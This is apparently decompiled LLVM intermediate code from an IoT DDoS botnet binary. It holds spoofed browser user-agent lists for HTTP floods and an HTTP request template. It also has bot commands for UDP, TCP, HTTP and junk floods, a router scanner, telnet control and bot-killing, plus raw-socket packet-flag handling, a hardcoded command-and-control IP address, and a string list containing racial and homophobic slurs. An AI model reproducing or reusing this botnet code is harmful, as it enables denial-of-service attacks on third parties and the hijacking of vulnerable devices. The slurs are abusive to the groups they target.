@global_var_21380.634 = constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00"
@global_var_213f4.635 = constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00"
@global_var_21434.636 = constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_214ec.637 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_21540.638 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_21598.639 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_215f0.640 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_21630.641 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_21678.642 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_216d0.643 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_2173c.644 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_21794.645 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_217e4.646 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_21808.647 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_21864.648 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_21874.649 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_218a4.650 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_218c8.651 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_218ec.652 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_21908.653 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_21948.654 = constant [140 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_219d4.655 = constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_21a1c.656 = constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_21a64.657 = constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_21aac.658 = constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_21af4.659 = constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00"
@global_var_21b48.660 = constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00"
@global_var_21b98.661 = constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00"
@global_var_21c04.662 = constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00"
@global_var_21c58.663 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00"
@global_var_21cb4.664 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00"
@global_var_21d10.665 = constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00"
@global_var_21d74.666 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00"
@global_var_21dd0.667 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_21e2c.668 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_21e88.669 = constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_21ee8.670 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00"
@global_var_21f30.671 = constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00"
@global_var_21fc8.672 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00"
@global_var_22014.673 = constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_22060.674 = constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00"
@global_var_220b0.675 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00"
@global_var_220f8.676 = constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00"
@global_var_2214c.677 = constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00"
@global_var_2219c.678 = constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00"
@global_var_221e4.679 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00"
@global_var_22230.680 = constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_2227c.681 = constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00"
@global_var_222c4.682 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_22314.683 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_22364.684 = constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_22398.685 = constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_223cc.686 = constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00"
@global_var_22414.687 = constant [62 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @global_var_210b4.625, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_210f4.626, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @global_var_21134.627, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_211c4.628, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_211fc.629, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_2121c.630, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_21234.631, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @global_var_2128c.632, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_2132c.633, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_21380.634, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_213f4.635, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @global_var_21434.636, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_214ec.637, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_21540.638, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_21598.639, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_215f0.640, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_21630.641, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_21678.642, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @global_var_216d0.643, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @global_var_2173c.644, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_21794.645, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_217e4.646, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_21808.647, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_21864.648, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_21874.649, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @global_var_218a4.650, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_218c8.651, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @global_var_218ec.652, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_21908.653, i32 0, i32 0), i8* getelementptr inbounds ([140 x i8], [140 x i8]* @global_var_21948.654, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_219d4.655, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_21a1c.656, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_21a64.657, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_21aac.658, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_21af4.659, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_21b48.660, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @global_var_21b98.661, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_21c04.662, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_21c58.663, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_21cb4.664, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @global_var_21d10.665, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_21d74.666, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_21dd0.667, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_21e2c.668, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @global_var_21e88.669, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_21ee8.670, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @global_var_21f30.671, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_21fc8.672, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_22014.673, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_22060.674, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_220b0.675, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @global_var_220f8.676, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_2214c.677, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_2219c.678, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_221e4.679, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_22230.680, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_2227c.681, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_222c4.682, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_22314.683, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_22364.684, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_22398.685, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @global_var_223cc.686, i32 0, i32 0)]
@global_var_2108c.689 = constant [6 x i8] c"close\00"
@global_var_21094.690 = constant [11 x i8] c"keep-alive\00"
@global_var_210a0.691 = constant [7 x i8] c"accept\00"
@global_var_210a8.692 = constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_2108c.689, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21094.690, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_210a0.691, i32 0, i32 0)]
@global_var_2250c.697 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_2254c.699 = constant [6 x i8] c"arfgG\00"
@global_var_22554.700 = constant [9 x i8] c"HBiug655\00"
@global_var_22560.701 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_22570.702 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_22584.703 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_22598.704 = constant [12 x i8] c"GJjyur67458\00"
@global_var_225a4.705 = constant [12 x i8] c"RYSDk747586\00"
@global_var_225b0.706 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_225bc.707 = constant [10 x i8] c"KHGK7985i\00"
@global_var_225c8.708 = constant [11 x i8] c"yuituiILYF\00"
@global_var_225d4.709 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_225e4.710 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_225f0.711 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_22600.712 = constant [9 x i8] c"ewqdcftr\00"
@global_var_2260c.713 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_2261c.714 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_22628.715 = constant [12 x i8] c"twehgbferhb\00"
@global_var_22634.716 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_22640.717 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_22650.718 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_22660.719 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_22670.720 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_2267c.721 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_2268c.722 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_2269c.723 = constant [12 x i8] c"yteytietyue\00"
@global_var_226a8.724 = constant [9 x i8] c"qsortEQS\00"
@global_var_226b4.725 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_226c4.726 = constant [4 x i8] c"std\00"
@global_var_226c8.727 = constant [4 x i8] c"dts\00"
@global_var_226cc.728 = constant [6 x i8] c"hackz\00"
@global_var_226d4.729 = constant [7 x i8] c"shdyed\00"
@global_var_226dc.730 = constant [5 x i8] c"http\00"
@global_var_226e4.731 = constant [10 x i8] c"sghwiondc\00"
@global_var_226f0.732 = constant [7 x i8] c"nigger\00"
@global_var_226f8.733 = constant [6 x i8] c"pussy\00"
@global_var_22700.734 = constant [7 x i8] c"faggot\00"
@global_var_22708.735 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_2254c.699, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_22554.700, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_22560.701, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_22570.702, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_22584.703, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_22598.704, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_225a4.705, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_225b0.706, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_225bc.707, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_225c8.708, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_225d4.709, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_225e4.710, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_225f0.711, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_22600.712, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_2260c.713, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_2261c.714, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_22628.715, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_22634.716, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_22640.717, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_22650.718, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_22660.719, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_22670.720, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_2267c.721, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_2268c.722, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_2269c.723, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_226a8.724, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_226b4.725, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_226c4.726, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_226c8.727, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_226cc.728, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_226d4.729, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_226dc.730, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_226e4.731, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_226f0.732, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_226f8.733, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_22700.734, i32 0, i32 0)]
@global_var_22798.739 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_227b4.741 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_227d8.746 = constant [4 x i8] c"all\00"
@global_var_227dc.748 = constant i32 44
@global_var_227e0.750 = constant [4 x i8] c"syn\00"
@global_var_227e4.752 = constant [4 x i8] c"rst\00"
@global_var_227e8.754 = constant [4 x i8] c"fin\00"
@global_var_227ec.756 = constant [4 x i8] c"ack\00"
@global_var_227f0.758 = constant [4 x i8] c"psh\00"
@global_var_227f4.760 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_22808.764 = constant [6 x i8] c"PONG!\00"
@global_var_22810.766 = constant [11 x i8] c"GETLOCALIP\00"
@global_var_2281c.769 = constant [10 x i8] c"My IP: %s\00"
@global_var_22828.771 = constant [8 x i8] c"BOTKILL\00"
@global_var_22830.773 = constant [13 x i8] c"Killing Bots\00"
@global_var_22840.775 = constant [7 x i8] c"LOOPME\00"
@global_var_22848.777 = constant [16 x i8] c"LOOPING PAYLOAD\00"
@global_var_22858.779 = constant [7 x i8] c"TELNET\00"
@global_var_22860.781 = constant [16 x i8] c"TELNET ON | OFF\00"
@global_var_22870.783 = constant [4 x i8] c"OFF\00"
@global_var_3284c.785 = global i32 0
@global_var_22874.787 = constant [5 x i8] c" OFF\00"
@global_var_2287c.789 = constant [3 x i8] c"ON\00"
@global_var_22880.791 = constant [6 x i8] c"NETIS\00"
@global_var_22888.793 = constant [25 x i8] c"[NETIS] SCANNER Starting\00"
@global_var_228a4.795 = constant [5 x i8] c"HOLD\00"
@global_var_228ac.798 = constant [5 x i8] c"JUNK\00"
@global_var_228b4.800 = constant [4 x i8] c"UDP\00"
@global_var_228b8.802 = constant [5 x i8] c"HTTP\00"
@global_var_228c0.804 = constant [4 x i8] c"CNC\00"
@global_var_228c4.806 = constant [6 x i8] c"COMBO\00"
@global_var_228cc.808 = constant [4 x i8] c"STD\00"
@global_var_228d0.810 = constant [4 x i8] c"TCP\00"
@global_var_228d4.812 = constant [5 x i8] c"STOP\00"
@global_var_228dc.816 = constant [12 x i8] c"HOODASSSHIT\00"
@global_var_2c278.819 = local_unnamed_addr global i32 -1
@global_var_1f7a8.821 = constant [16 x i8] c"188.213.170.176\00"
@global_var_2c1e0.822 = global [16 x i8]* @global_var_1f7a8.821
@global_var_2c1e4.824 = local_unnamed_addr global i32 47
@global_var_228e8.826 = constant [8 x i8] c"8.8.8.8\00"
@global_var_228f0.829 = constant [16 x i8] c"/proc/net/route\00"
@global_var_22900.831 = constant [11 x i8] c"\0900000000\09\00"
@global_var_2c5f8.833 = global i32 0
@global_var_2290c.835 = constant [16 x i8] c"/usr/bin/python\00"
@global_var_2291c.837 = constant [7 x i8] c"SERVER\00"
@global_var_22924.839 = constant [7 x i8] c"ROUTER\00"
@global_var_2292c.841 = constant i32 0
@global_var_22930.844 = constant [5 x i8] c"sshd\00"
@global_var_22938.846 = constant [19 x i8] c"/usr/sbin/dropbear\00"
@global_var_2c274.848 = global i32 1
@global_var_2294c.851 = constant [13 x i8] c"BUILD %s:%s\0A\00"
@global_var_2295c.853 = constant i32 47
@global_var_229a4.856 = constant [8 x i8] c"Love <3\00"
@global_var_22960.858 = constant i32 993090331
@global_var_229ac.863 = constant [5 x i8] c"PONG\00"
@global_var_229b4.865 = constant [4 x i8] c"DUP\00"
@global_var_229b8.867 = constant [5 x i8] c"MOVE\00"
@global_var_229c0.869 = constant [8 x i8] c"%s 2>&1\00"
@1 = constant [3 x i32] %wide-string
@global_var_229cc.873 = constant i32 32
@global_var_146f4.890 = constant i32 -382910448
@global_var_19b3c.891 = constant i32 -382909968
@global_var_19ef8.897 = constant i32 -382910224
@global_var_1598c.922 = constant i32 -456978431
@global_var_15be4.959 = constant i32 167772168
@global_var_16740.966 = constant i32 -478871519
@global_var_170b4.976 = constant i32 -382906384
@global_var_14314.985 = constant i32 -509591552
@global_var_17674.991 = constant i32 -442564540
@global_var_17f1c.1034 = constant i32 -494075872
@global_var_14340.1035 = constant i32 -382910336
@global_var_180dc.1047 = constant i32 -369098421
@global_var_174e4.1066 = constant i32 -442543860
@global_var_15a40.1075 = constant i32 -369093142
@global_var_18b54.1088 = constant i32 -335545171
@global_var_190e8.1105 = constant i32 -443088884
@global_var_17268.1116 = constant i32 -382909968
@global_var_1ae14.1123 = constant i32 -382906384
@global_var_20003.1132 = constant i32 775107584
@global_var_20000.1133 = constant i32 0
@global_var_19e98.1143 = constant i32 -509607926
@global_var_1ac38.1161 = constant i32 -509607928
@global_var_1c0fc.1206 = constant i32 -478805983
@global_var_1c688.1214 = constant i32 -382909456
@global_var_14378.1237 = constant i32 -382910336
@global_var_1db2c.1242 = constant i32 -442695584
@global_var_1e0f4.1251 = constant i32 -382910224
@global_var_1efb0.1279 = constant i32 -504313148
@global_var_1ef98.1280 = constant i32 -483131392
@global_var_1ee44.1281 = constant i32 -481229311
@global_var_1f020.1282 = constant i32 -477817729
@global_var_1f120.1283 = constant i32 -476034303
@global_var_1f35c.1284 = constant i32 -516685812
@global_var_1f250.1285 = constant i32 -905969571
@global_var_1f184.1286 = constant i32 -528203771
@global_var_1f3e4.1287 = constant i32 -478079873
@global_var_1f3c8.1288 = constant i32 -534704125
@global_var_1f378.1289 = constant i32 -534704125
@global_var_1f310.1290 = constant i32 -483131392
@global_var_2c5c8.3 = external global i8*
@global_var_2c5fe.63 = external global i8*
@global_var_2c5ff.64 = local_unnamed_addr global i8 0
@global_var_2c600.65 = local_unnamed_addr global i8 0
@global_var_2c601.66 = local_unnamed_addr global i8 0
@global_var_2c602.67 = local_unnamed_addr global i8 0
@global_var_2c158.876 = global i16 0
@global_var_229c8.871 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80b8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80b8)
  %v31_80c0 = load i32, i32* @r0, align 4
  ret i32 %v31_80c0
}

define i32 @_call_via_r0(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  ret i32 %arg1
}

define i32 @_call_via_r1(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80d4 = load i32, i32* @r0, align 4
  ret i32 %v1_80d4
}

define i32 @_call_via_r2(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80d8 = load i32, i32* @r0, align 4
  ret i32 %v1_80d8
}

define i32 @_call_via_r3(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80dc = load i32, i32* @r0, align 4
  ret i32 %v1_80dc
}

define i32 @_call_via_r4() local_unnamed_addr {
entry:
  %v0_80e0 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v0_80e0)
  %v1_80e0 = load i32, i32* @r0, align 4
  ret i32 %v1_80e0
}

define i32 @_call_via_r5() local_unnamed_addr {
entry:
  %v0_80e4 = load i32, i32* @r5, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v1_80e4 = load i32, i32* @r0, align 4
  ret i32 %v1_80e4
}

define i32 @_call_via_r6() local_unnamed_addr {
entry:
  %v0_80e8 = load i32, i32* @r6, align 4
  call void @__pseudo_branch(i32 %v0_80e8)
  %v1_80e8 = load i32, i32* @r0, align 4
  ret i32 %v1_80e8
}

define i32 @_call_via_r7() local_unnamed_addr {
entry:
  %v0_80ec = load i32, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v0_80ec)
  %v1_80ec = load i32, i32* @r0, align 4
  ret i32 %v1_80ec
}

define i32 @_call_via_r8() local_unnamed_addr {
entry:
  %v0_80f0 = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %v0_80f0)
  %v1_80f0 = load i32, i32* @r0, align 4
  ret i32 %v1_80f0
}

define i32 @_call_via_r9() local_unnamed_addr {
entry:
  %v0_80f4 = load i32, i32* @sb, align 4
  call void @__pseudo_branch(i32 %v0_80f4)
  %v1_80f4 = load i32, i32* @r0, align 4
  ret i32 %v1_80f4
}

define i32 @_call_via_sl() local_unnamed_addr {
entry:
  %v0_80f8 = load i32, i32* @sl, align 4
  call void @__pseudo_branch(i32 %v0_80f8)
  %v1_80f8 = load i32, i32* @r0, align 4
  ret i32 %v1_80f8
}

define i32 @_call_via_fp() local_unnamed_addr {
entry:
  %v0_80fc = load i32, i32* @fp, align 4
  call void @__pseudo_branch(i32 %v0_80fc)
  %v1_80fc = load i32, i32* @r0, align 4
  ret i32 %v1_80fc
}

define i32 @_call_via_ip() local_unnamed_addr {
entry:
  %v0_8100 = load i32, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v0_8100)
  %v1_8100 = load i32, i32* @r0, align 4
  ret i32 %v1_8100
}

define i32 @_call_via_sp() local_unnamed_addr {
entry:
  %v0_8104 = load i32, i32* @sp, align 4
  call void @__pseudo_branch(i32 %v0_8104)
  %v1_8104 = load i32, i32* @r0, align 4
  ret i32 %v1_8104
}

